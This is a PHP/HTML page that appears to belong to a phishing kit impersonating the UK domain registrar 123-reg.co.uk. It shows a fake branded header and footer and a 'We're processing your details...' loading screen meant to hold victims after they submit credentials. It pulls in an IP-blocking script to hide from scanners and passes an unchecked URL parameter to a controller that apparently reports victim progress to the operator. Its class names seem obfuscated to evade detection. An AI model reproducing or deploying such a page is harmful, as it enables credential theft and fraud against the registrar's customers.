<?php 
require '../main.php';
require_once 'blockip.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/ico" href="./img/favicon.png" />
    <title>123-reg.co.uk</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        body {
            background-color: #FFFFFF;
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .wave {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background-color: #fff;
            border-bottom: 1px solid #e0e0e0;
            padding: 15px 0;
        }

        .shoreline {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .surfboard {
            color: #111;
        }

        .beachbreak {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        /* Main Content */
        main {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        /* Loading Spinner */
        .spinner {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            position: relative;
            margin-bottom: 20px;
        }

        .spinner::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 5px solid #e0e0e0;
        }

        .spinner::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 5px solid transparent;
            border-top-color: #00a4a6;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Loading Text */
        .loading-text {
            font-size: 16px;
            color: #333;
            text-align: center;
        }

        /* Footer */
        .tideline {
            text-align: center;
            padding: 20px 0;
            background-color: #f8f8f8;
            color: #666;
            font-size: 12px;
            margin-top: auto;
        }

        .tideline a {
            color: #00a4a6;
            text-decoration: none;
        }

        .tideline a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <header>
        <div class="wave shoreline">
            <div class="surfboard">
                <img src="./img/lgo.webp" width="140" height="40">
            </div>
            <div class="beachbreak">
                <img src="./img/out.webp" width="24" height="24" style="max-width: 24px; height: auto;">
            </div>
        </div>
    </header>

    <main>
        <div class="spinner"></div>
        <p class="loading-text">We're processing your details...</p>
    </main>

    <footer class="tideline">
        <div class="wave">
            Copyright © 1999 - 2025 123-reg.co.uk Operating Company, LLC. All Rights Reserved. 
            <a>Privacy Policy</a>
        </div>
    </footer>
        <script src="js/jq.js"></script>
<?php $m->ctr(" LOADING ♻️".@$_GET['e']); ?>
</body>
</html>

